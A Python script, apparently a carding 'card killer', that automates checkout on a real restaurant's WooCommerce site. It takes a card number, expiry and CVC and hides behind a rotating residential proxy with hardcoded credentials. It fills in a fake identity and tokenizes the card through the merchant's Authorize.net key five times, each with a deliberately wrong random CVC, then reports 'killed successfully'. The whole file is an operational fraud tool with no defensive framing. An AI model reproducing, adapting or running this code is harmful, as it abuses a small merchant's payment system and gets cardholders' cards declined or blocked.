import asyncio
import httpx
import random
import json
from faker import Faker
import urllib.parse
import time
from user_agent import generate_user_agent

def get_usa_address():
    fake = Faker('en_US')
    full_name = fake.name().split()
    first_name = full_name[0]
    last_name = " ".join(full_name[1:]) if len(full_name) > 1 else ""

    address = {
        "first_name": first_name,
        "last_name": last_name,
        "address_line1": fake.street_address(),
        "city": fake.city(),
        "state": fake.state_abbr(),
        "zip": fake.zipcode(),
        "email" : fake.email()
    }
    return address

def get_number(exclude):
    numbers = [i for i in range(100, 1000) if i != exclude]
    return str(random.choice(numbers))

async def pk2(cc:str):
    num,mm,yy,cvc = cc.split("|")
    if not num.startswith('4'):
        return 'Only Visa Card Allowed'
    if "20" not in yy:
        yy = f"20{yy}"
    yy1 = yy[2:]
    user = generate_user_agent()  # for headers
    user2 = urllib.parse.quote_plus(user)
    last4 = num[-4:]
    headers1 = {'user-agent': user}
    username = "sf30p9orymc24y0"
    password = "h5t0p437lspawbq"
    proxy = "http://{}:{}@rp.scrapegw.com:6060".format(username, password)
    transport = httpx.AsyncHTTPTransport(proxy=proxy)
    try:
        async with httpx.AsyncClient(transport=transport, timeout=30) as ses:
            await ses.get("https://www.dinnersbydelaine.com/weekly-menu/",headers=headers1)
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
                'cache-control': 'max-age=0',
                'origin': 'https://www.dinnersbydelaine.com',
                'priority': 'u=0, i',
                'referer': 'https://www.dinnersbydelaine.com/weekly-menu/',
                'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Linux"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': user,
            }

            params = {
                'is_shop_attr': 'yes',
            }

            files = {
                'dinners_shop_page_url': (None, 'https://www.dinnersbydelaine.com/weekly-menu/'),
                'quantity': (None, '1'),
                'add-to-cart': (None, '13753'),
            }

            response = await ses.post(
                'https://www.dinnersbydelaine.com/weekly-menu/',
                params=params,
                headers=headers,
                files=files,
            )
            headers = {
                'Referer': 'https://www.dinnersbydelaine.com/weekly-menu/',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': user,
                'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Linux"',
            }

            await ses.get('https://www.dinnersbydelaine.com/cart/', headers=headers)
            headers = {
                'Referer': 'https://www.dinnersbydelaine.com/shop/',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': user,
                'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Linux"',
            }

            chkout = await ses.get('https://www.dinnersbydelaine.com/checkout/', headers=headers)
            print(chkout)
            text = chkout.text
            uron = text.split('"update_order_review_nonce":"')[1].split('"')[0]
            cpn = text.split('<input type="hidden" id="woocommerce-process-checkout-nonce" name="woocommerce-process-checkout-nonce" value="')[1].split('"')[0]
            headers = {
                'accept': '*/*',
                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://www.dinnersbydelaine.com',
                'priority': 'u=1, i',
                'referer': 'https://www.dinnersbydelaine.com/checkout/',
                'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Linux"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': user,
                'x-requested-with': 'XMLHttpRequest',
            }

            params = {
                'wc-ajax': 'update_order_review',
            }
            address = get_usa_address()
            fn = address['first_name']
            ln = address['last_name']
            add = address['address_line1']
            email = address['email']
            city = urllib.parse.quote('New York')
            en_street = add.replace(' ','+')
            en_email = urllib.parse.quote(email)
            en_st = urllib.parse.quote(add)
            data = f'security={str(uron)}&payment_method=authorize_net_cim_credit_card&country=US&state=NY&postcode=10080&city=New+York&address={en_street}&address_2=&s_country=US&s_state=NY&s_postcode=10080&s_city=New+York&s_address={en_street}&s_address_2=&has_full_address=true&post_data=shipping_method%255B0%255D%3Dlocal_pickup%253A12%26wc_order_attribution_source_type%3Dtypein%26wc_order_attribution_referrer%3D(none)%26wc_order_attribution_utm_campaign%3D(none)%26wc_order_attribution_utm_source%3D(direct)%26wc_order_attribution_utm_medium%3D(none)%26wc_order_attribution_utm_content%3D(none)%26wc_order_attribution_utm_id%3D(none)%26wc_order_attribution_utm_term%3D(none)%26wc_order_attribution_utm_source_platform%3D(none)%26wc_order_attribution_utm_creative_format%3D(none)%26wc_order_attribution_utm_marketing_tactic%3D(none)%26wc_order_attribution_session_entry%3Dhttps%253A%252F%252Fwww.dinnersbydelaine.com%252Fcart%252F%26wc_order_attribution_session_start_time%3D2025-06-30%252010%253A18%253A56%26wc_order_attribution_session_pages%3D6%26wc_order_attribution_session_count%3D1%26wc_order_attribution_user_agent%3D{user2}%26billing_first_name%3D{fn}%26billing_last_name%3D{ln}%26billing_company%3D%26billing_country%3DUS%26billing_address_1%3D{en_st}%26billing_address_2%3D%26billing_city%3D{city}%26billing_state%3DNY%26billing_postcode%3D10080%26billing_phone%3D%26billing_email%3D%26mailchimp_woocommerce_newsletter%3D1%26shipping_first_name%3D%26shipping_last_name%3D%26shipping_company%3D%26shipping_country%3DUS%26shipping_address_1%3D%26shipping_address_2%3D%26shipping_city%3D%26shipping_state%3D%26shipping_postcode%3D%26shipping_phone%3D%26order_comments%3D%26payment_method%3Dauthorize_net_cim_credit_card%26wc-authorize-net-cim-credit-card-context%3Dshortcode%26wc-authorize-net-cim-credit-card-expiry%3D%26wc-authorize-net-cim-credit-card-payment-nonce%3D%26wc-authorize-net-cim-credit-card-payment-descriptor%3D%26wc-authorize-net-cim-credit-card-last-four%3D%26wc-authorize-net-cim-credit-card-card-type%3D%26twilio_subscribe%3D1%26woocommerce-process-checkout-nonce%3D{cpn}%26_wp_http_referer%3D%252F%253Fwc-ajax%253Dupdate_order_review&shipping_method%5B0%5D=local_pickup%3A12'

            uron = await ses.post('https://www.dinnersbydelaine.com/', params=params, headers=headers, data=data)
            for _ in range(5):
                headers = {
                    'Accept': '*/*',
                    'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
                    'Connection': 'keep-alive',
                    'Content-Type': 'application/json; charset=UTF-8',
                    'Origin': 'https://www.dinnersbydelaine.com',
                    'Referer': 'https://www.dinnersbydelaine.com/',
                    'Sec-Fetch-Dest': 'empty',
                    'Sec-Fetch-Mode': 'cors',
                    'Sec-Fetch-Site': 'cross-site',
                    'User-Agent': user,
                    'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Linux"',
                }

                json_data = {
                    'securePaymentContainerRequest': {
                        'merchantAuthentication': {
                            'name': '963E6TvyD7',
                            'clientKey': '27VxQJdaZXKjLSx4GhHLGZje7u5fWPLG3Q8rM4z8sJCm92nfX32n9U8DD87x82Lc',
                        },
                        'data': {
                            'type': 'TOKEN',
                            'id': '75244f7a-22aa-f017-e3eb-52ad5eccfb7f',
                            'token': {
                                'cardNumber': num,
                                'expirationDate': f'{mm}{yy}',
                                'cardCode': get_number(cvc),
                                'zip': '10080',
                                'fullName': 'ayush kumar',
                            },
                        },
                    },
                }

                cctoken = await ses.post('https://api2.authorize.net/xml/v1/request.api', headers=headers, json=json_data)
                cctok = cctoken.text.split('"dataValue":"')[1].split('"')[0]
                headers = {
                    'accept': 'application/json, text/javascript, */*; q=0.01',
                    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'origin': 'https://www.dinnersbydelaine.com',
                    'priority': 'u=1, i',
                    'referer': 'https://www.dinnersbydelaine.com/checkout/',
                    'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Linux"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'user-agent': user,
                    'x-requested-with': 'XMLHttpRequest',
                }

                params = {
                    'wc-ajax': 'checkout',
                }

                data = f'shipping_method%5B0%5D=local_pickup%3A12&wc_order_attribution_source_type=typein&wc_order_attribution_referrer=(none)&wc_order_attribution_utm_campaign=(none)&wc_order_attribution_utm_source=(direct)&wc_order_attribution_utm_medium=(none)&wc_order_attribution_utm_content=(none)&wc_order_attribution_utm_id=(none)&wc_order_attribution_utm_term=(none)&wc_order_attribution_utm_source_platform=(none)&wc_order_attribution_utm_creative_format=(none)&wc_order_attribution_utm_marketing_tactic=(none)&wc_order_attribution_session_entry=https%3A%2F%2Fwww.dinnersbydelaine.com%2Fcart%2F&wc_order_attribution_session_start_time=2025-06-30+10%3A18%3A56&wc_order_attribution_session_pages=6&wc_order_attribution_session_count=1&wc_order_attribution_user_agent={user2}&billing_first_name={fn}&billing_last_name={ln}&billing_company=&billing_country=US&billing_address_1={en_street}&billing_address_2=&billing_city=New+York&billing_state=NY&billing_postcode=10080&billing_phone=(572)+658-9845&billing_email={en_email}&shipping_first_name=&shipping_last_name=&shipping_company=&shipping_country=US&shipping_address_1=&shipping_address_2=&shipping_city=&shipping_state=&shipping_postcode=&shipping_phone=&order_comments=&payment_method=authorize_net_cim_credit_card&wc-authorize-net-cim-credit-card-context=shortcode&wc-authorize-net-cim-credit-card-expiry={mm}+%2F+{yy1}&wc-authorize-net-cim-credit-card-payment-nonce={cctok}&wc-authorize-net-cim-credit-card-payment-descriptor=COMMON.ACCEPT.INAPP.PAYMENT&wc-authorize-net-cim-credit-card-last-four={last4}&wc-authorize-net-cim-credit-card-card-type=visa&twilio_subscribe=1&woocommerce-process-checkout-nonce={cpn}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review'

                response = await ses.post('https://www.dinnersbydelaine.com/', params=params, headers=headers, data=data)
                print(response.text)
            return "killed successfully"
    except Exception as e:
        print(e)
        return f'Error ; {e}'